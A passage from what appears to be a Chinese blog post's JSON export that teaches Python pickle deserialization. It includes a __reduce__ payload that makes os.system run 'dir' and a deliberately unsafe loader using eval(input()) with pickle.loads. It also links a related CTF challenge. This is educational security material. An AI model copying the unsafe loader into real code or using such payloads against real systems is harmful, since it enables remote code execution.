punctuation\">)</span>\n    ls <span class=\"token operator\">=</span> pickle<span class=\"token punctuation\">.</span>loads<span class=\"token punctuation\">(</span>urllib<span class=\"token punctuation\">.</span>unquote<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>ls<span class=\"token punctuation\">)</span>\n\n\n<span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">\"__main__\"</span><span class=\"token punctuation\">:</span>\n    unserialize<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>这里要使用raw_input()函数来接收数据，因为input()在python2中只接受变量作为传入值，非变量内容会报错。</p>\n<p><img src=\"https://gitee.com/A1andNS/blogimage/raw/master/img/image-20210204123657348.png\" alt=\"image-20210204123657348\"></p>\n<p>再次成功实现了反序列化操作。</p>\n<h2 id=\"魔术方法\"><a href=\"#魔术方法\" class=\"headerlink\" title=\"魔术方法\"></a>魔术方法</h2><p>这里简单介绍一种常用的魔术方法，以下内容使用Python3进行说明</p>\n<h3 id=\"reduce\"><a href=\"#reduce\" class=\"headerlink\" title=\"__reduce__\"></a><code>__reduce__</code></h3><p><code>__reduce__</code>魔术方法上出现反序列化漏洞，和PHP的<code>__wakeup</code>魔术方法类似，都是在反序列化开始或结束时，自动调用这类的函数，并且一般会在内部将解析出来的结构去执行一下，所以可以导致出现RCE等问题。当 <code>__reduce__()</code>函数返回一个元组时 , 第一个元素是一个可调用对象 , 这个对象会在创建对象时被调用 . 第二个元素是可调用对象的参数 , 同样是一个元组。</p>\n<p>首先生成一个序列化的bytes变量：</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> pickle\n<span class=\"token keyword\">import</span> os\n\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">Payload</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">object</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">def</span> <span class=\"token function\">__reduce__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        cmd <span class=\"token operator\">=</span> <span class=\"token string\">'dir'</span>\n        <span class=\"token keyword\">return</span> os<span class=\"token punctuation\">.</span>system<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>cmd<span class=\"token punctuation\">,</span><span class=\"token punctuation\">)</span>\n\n\na <span class=\"token operator\">=</span> Payload<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\ns <span class=\"token operator\">=</span> pickle<span class=\"token punctuation\">.</span>dumps<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span>\n\n<span class=\"token triple-quoted-string string\">'''运行结果'''</span>\n<span class=\"token string\">b'\\x80\\x04\\x95\\x1b\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x8c\\x02nt\\x94\\x8c\\x06system\\x94\\x93\\x94\\x8c\\x03dir\\x94\\x85\\x94R\\x94.'</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>这里我们在<code>__reduce__</code>里return了一个二元组<code>(os.system,(cmd,),)</code>，这里最外的可以省略，就变成了脚本中的<code>os.system,(cmd,)</code>，正如前面说的，这里的os.system就是第一个元组参数，即被调用函数。而(cmd,)则是第二个参数，即被调用函数的参数。最后解析结果是os.system(“dir”)。接下来我们对它进行一个反序列化操作，看看<code>__reduce__</code>被触发时，会发生什么。</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> pickle\n\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    data <span class=\"token operator\">=</span> <span class=\"token builtin\">eval</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">'please enter your data:'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    ls <span class=\"token operator\">=</span> pickle<span class=\"token punctuation\">.</span>loads<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> ls\n\n\n<span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">\"__main__\"</span><span class=\"token punctuation\">:</span>\n    unserialize<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://gitee.com/A1andNS/blogimage/raw/master/img/image-20210204143623249.png\" alt=\"image-20210204143623249\"></p>\n<p>正如我们预计的确实是成功进行了命令执行。但是这里又一个问题必须要注意，os.system 调用系统命令，完成后退出，返回结果是命令执行状态，一般是0 os.popen() 无法读取程序执行的返回值。如果是作为网页后端，os.system和os.popen执行命令只有在配合print时才可以正常输出内容，如何时return与之配合将会没有回显。这时候就可以尝试使用commands.getoutput()函数来进行替换，构造payload去执行命令，用法和os.system和os.popen一样。这里就不演示了，可以去BUUOJ上做一下[CISCN2019 华北赛区 Day1 Web2]iku这题，这题的反序列化就很好的体现了这一点。</p>\n<h2 id=\"参考材料\"><a href=\"#参考材料\" class=\"headerlink\" title=\"参考材料\"></a>参考材料</h2><p>[1] <a href=\"https://xz.aliyun.com/t/2289#toc-2\">https://xz.aliyun.com/t/2289#toc-2</a></p>\n<p>[2] <a href=\"https://zhuanlan.zhihu.com/p/25981037\">https://zhuanlan.zhihu.com/p/25981037</a></p>\n<p>[3] <a href=\"https://www.freebuf.com/articles/web/252189.html\">https://www.freebuf.com/articles/web/252189.html</a></p>\n","text":"前言以下内容主要是基于Python3的，Python2环境下序列化的用法和以下类似，但是序列化生成的结果与Python3环境下是不同的。Python 2的pickle内容从实例三开始。 什么是pickle库 Python标准库，只支持python的基本数据类型。 可以处理复杂的序...","link":"","photos":[],"count_time":{"symbolsCount":"5.6k","symbolsTime":"5 mins."},"categories":[{"name":"Python学习","slug":"Python学习","count":19,"path":"api/categories/Python学习.json"}],"tags":[{"name":"Python","slug":"Python","count":23,"path":"api/tags/Python.json"},{"name":"pickle","slug":"pickle","count":1,"path":"api/tags/pickle.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%89%8D%E8%A8%80\"><span class=\"toc-text\">前言</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E4%BB%80%E4%B9%88%E6%98%AFpickle%E5%BA%93\"><span class=\"toc-text\">什么是pickle库</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8pickle%E5%BA%93\"><span class=\"toc-text\">如何使用pickle库</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#pickle-dump\"><span class=\"toc-text\">pickle.dump()</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#pickle-load\"><span class=\"toc-text\">pickle.load()</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#pickle-dumps\"><span class=\"toc-text\">pickle.dumps()</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#pickle-loads\"><span class=\"toc-text\">pickle.loads()</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%AE%9E%E4%BE%8B%E4%B8%80\"><span class=\"toc-text\">实例一</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%B0pkl%E6%96%87%E4%BB%B6\"><span class=\"toc-text\">序列化到pkl文件</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E4%BB%8Epkl%E6%96%87%E4%BB%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96\"><span class=\"toc-text\">从pkl文件反序列化</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%AE%9E%E4%BE%8B%E4%BA%8C\"><span class=\"toc-text\">实例二</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%B0%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AD%97%E7%AC%A6\"><span class=\"toc-text\">序列化到二进制字符</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AD%97%E7%AC%A6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96\"><span class=\"toc-text\">二进制字符反序列化</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%AE%9E%E4%BE%8B%E4%B8%89\"><span class=\"toc-text\">实例三</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%B0pkl%E6%96%87%E4%BB%B6-1\"><span class=\"toc-text\">序列化到pkl文件</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E4%BB%8Epkl%E6%96%87%E4%BB%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-1\"><span class=\"toc-text\">从pkl文件反序列化</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%AE%9E%E4%BE%8B%E5%9B%9B\"><span class=\"toc-text\">实例四</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%B0%E5%AD%97%E7%AC%A6%E4%B8%B2\"><span class=\"toc-text\">序列化到字符串</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E4%BB%8E%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96\"><span class=\"toc-text\">从字符串反序列化</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95\"><span class=\"toc-text\">魔术方法</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#reduce\"><span class=\"toc-text\">__reduce__</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%8F%82%E8%80%83%E6%9D%90%E6%96%99\"><span class=\"toc-text\">参考材料</span></a></li></ol>","author":{"name":"A1andNS","slug":"blog-author","avatar":"/svg/head.png","link":"/","description":"爱你所爱，行你所行，听从你心，无问西东","socials":{"github":"https://github.com/A1andNS","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"Flask框架学习(二)","uid":"68cdd39de211787f0d193b4d136b8041","slug":"Flask框架学习-二","date":"2021-03-01T04:07:21.000Z","updated":"2021-04-21T16:00:11.000Z","comments":true,"path":"api/articles/Flask框架学习-二.json","keywords":"A1andNS","cover":null,"text":"Flask小应用最简单的Flask小程序就是hello world了，下面用flask写一个hello world： from flask import Flask app = Flask(__name__) @app.route('/') def hello_world(): ...","link":"","photos":[],"count_time":{"symbolsCount":"12k","symbolsTime":"11 mins."},"categories":[{"name":"Python学习","slug":"Python学习","count":19,"path":"api/categories/Python学习.json"}],"tags":[{"name":"Flask","slug":"Flask","count":2,"path":"api/tags/Flask.json"}],"author":{"name":"A1andNS","slug":"blog-author","avatar":"/svg/head.png","link":"/","description":"爱你所爱，行你所行，听从你心，无问西东","socials":{"github":"https://github.com/A1andNS","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"BUUOJ刷题二月第一周","uid":"5b5f4ff7be54bdec87cb56e0a7ffce00","slug":"BUUOJ刷题二月第一周","date":"2021-02-01T12:31:38.000Z","updated":"2021-06-28T14:58:20.000Z","comments":true,"path":"api/articles/BUUOJ刷题二月第一周.json","keywords":"A1andNS","cover":"https://gitee.com/A1andNS/blogimage/raw/master/img/3.png","text":"[BJDCTF2020]EasySearch考点：SSI注入 直接简单试一试，都是failed，所以使用dirsearch去进行目录扫描，得到一个index.php.swp获取源码。 &lt;?php ob_start(); //加密hash，原文位唯一ID+随机字符(xxxxx...","link":"","photos":[],"count_time":{"symbolsCount":"5.3k","symbolsTime":"5 mins."},"categories":[{"name":"CTF","slug":"CTF","count":43,"path":"api/categories/CTF.json"}],"tags":[{"name":"BUUOJ","slug":"BUUOJ","count":13,"path":"api/tags/BUUOJ.json"}],"author":{"name":"A1andNS","slug":"blog-author","avatar":"/svg/head.png","link":"/","description":"爱你所爱，行你所行，听从你心，无问西东","socials":{"github":"https://github.com/A1andNS","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}